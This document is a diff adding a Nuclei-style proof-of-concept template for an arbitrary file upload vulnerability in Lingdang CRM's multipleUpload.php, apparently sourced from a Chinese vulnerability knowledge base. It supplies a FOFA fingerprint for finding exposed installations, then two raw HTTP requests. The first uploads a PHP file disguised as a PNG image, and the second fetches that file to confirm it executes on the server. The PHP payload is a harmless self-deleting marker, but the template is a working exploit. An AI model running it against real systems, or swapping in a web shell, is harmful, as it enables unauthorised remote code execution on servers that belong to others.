@@ -1,0 +1,65 @@
+id: poc-si6idxxee3vfnqno
+info:
+  name: 灵当CRM客户管理系统multipleupload 任意文件上传漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/si6idxxee3vfnqno'
+  tags: file-upload,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: si6idxxee3vfnqno
+    fofa: body="crmcommon/js/jquery/jquery-1.10.1.min.js"
+http:
+- raw:
+  - 'POST /crm/modules/Home/multipleUpload.php?myatt_id=1&myatt_moduel=1 HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: python-requests/2.32.3
+
+    Content-Length: 254
+
+    Accept: */*
+
+    Accept-Encoding: gzip, deflate, br
+
+    Connection: close
+
+    Content-Type: multipart/form-data; boundary=---------------------------w5jpbdxm77tff7kvw5l78nswyv
+
+    Cookie: PHPSESSID=q8n9njtnr88vintfeads41j8og
+
+
+    -----------------------------w5jpbdxm77tff7kvw5l78nswyv
+
+    Content-Disposition: form-data; name="file"; filename="u1pi5o.php"
+
+    Content-Type: image/png
+
+
+    <?php echo ''holetest'';unlink(__FILE__);?>
+
+    -----------------------------w5jpbdxm77tff7kvw5l78nswyv--
+
+
+    上传定位：'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
+- raw:
+  - 'GET /crm/storage/2024/September/week1/u1pi5o.php HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:99.0) Gecko/20100101 Firefox/99.0
+
+    Connection: close
+
+    Accept-Encoding: gzip, deflate, br'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
